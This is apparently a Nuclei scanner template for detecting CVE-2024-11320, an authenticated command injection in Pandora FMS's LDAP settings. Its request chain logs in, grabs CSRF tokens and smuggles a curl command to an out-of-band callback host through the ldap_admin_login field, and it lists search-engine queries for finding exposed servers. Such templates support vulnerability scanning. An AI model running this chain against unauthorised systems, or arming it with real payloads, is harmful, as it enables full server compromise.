flow: http(1) && http(2) && http(3) && http(4) && http(5) && http(6)
http:
- extractors:
  - group: 1
    internal: true
    name: csrf_code
    regex:
    - name="csrf_code" type="hidden"  value="([a-z0-9]+)" \/>
    type: regex
  raw:
  - 'GET /index.php?login=1 HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(set_cookie, 'PHPSESSID=')
    internal: true
    type: dsl
  raw:
  - 'POST /index.php?login=1 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    nick={{username}}&pass={{password}}&login_button=Let%27s+go&csrf_code={{csrf_code}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, 'Server health')
    internal: true
    type: dsl
  raw:
  - 'GET /index.php?logged=1&sec=general/logon_ok HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: csrf_code2
    regex:
    - name="csrf_code" type="hidden"  value="([a-z0-9]+)" \/>
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, 'Authentication method</td>', 'LDAP')
    internal: true
    type: dsl
  raw:
  - 'GET /index.php?sec=general&sec2=godmode/setup/setup&section=auth HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body,'Correctly updated the setup options')
    internal: true
    type: dsl
  raw:
  - 'POST /index.php?sec=general&sec2=godmode/setup/setup&section=auth HTTP/1.1

    Host: {{Hostname}}

    Referer: {{RootURL}}/index.php?sec=general&sec2=godmode/setup/setup&section=auth

    Content-Type: application/x-www-form-urlencoded


    update_config=1&csrf_code={{csrf_code2}}&auth=ldap&fallback_local_auth=1&fallback_local_auth_sent=1&ldap_server=localhost&ldap_port=389&ldap_version=3&ldap_start_tls_sent=1&ldap_base_dn=ou%253DPeople%252Cdc%253Dedu%252Cdc%253Dexample%252Cdc%253Dorg&ldap_login_attr=uid&ldap_admin_login=%27%3bcurl%20xxxxzz.{{interactsh-url}}%20%23&ldap_admin_pass=&ldap_search_timeout=0&secondary_ldap_enabled_sent=1&ldap_server_secondary=localhost&ldap_port_secondary=389&ldap_version_secondary=3&ldap_start_tls_secondary_sent=1&ldap_base_dn_secondary=ou%253DPeople%252Cdc%253Dedu%252Cdc%253Dexample%252Cdc%253Dorg&ldap_login_attr_secondary=uid&ldap_admin_login_secondary=&ldap_admin_pass_secondary=&double_auth_enabled_sent=1&2FA_all_users_sent=1&session_timeout=90&update_button=Update&ldap_function=local

    '
- disable-cookie: true
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  raw:
  - 'GET /index.php?login=1 HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-11320
info:
  author: DhiyaneshDK,Shubham Rooter,pdresearch,iamnoooob
  classification:
    cpe: cpe:2.3:a:pandorafms:pandora_fms:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-11320
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-77
    epss-percentile: 0.99696
    epss-score: 0.92171
  description: 'Arbitrary commands execution on the server by exploiting a command
    injection vulnerability in the LDAP authentication mechanism.This issue affects
    Pandora FMS- from 700 through <=777.4

    '
  impact: 'Authenticated attackers can execute arbitrary commands via command injection
    in the LDAP authentication mechanism, leading to complete system compromise.

    '
  metadata:
    fofa-query:
    - body="pandora fms - installation wizard"
    - title="pandora fms"
    google-query: intitle:"pandora fms"
    product: pandora_fms
    shodan-query:
    - http.html:"pandora fms - installation wizard"
    - http.title:"pandora fms"
    vendor: pandorafms
  name: Pandora v7.0NG.777.3 - Remote Code Execution
  reference:
  - https://github.com/mhaskar/CVE-2024-11320
  remediation: 'Upgrade Pandora FMS to version 777.5 or later.

    '
  severity: critical
  tags: cve,cve2024,oast,rce,pandora,fms,vuln
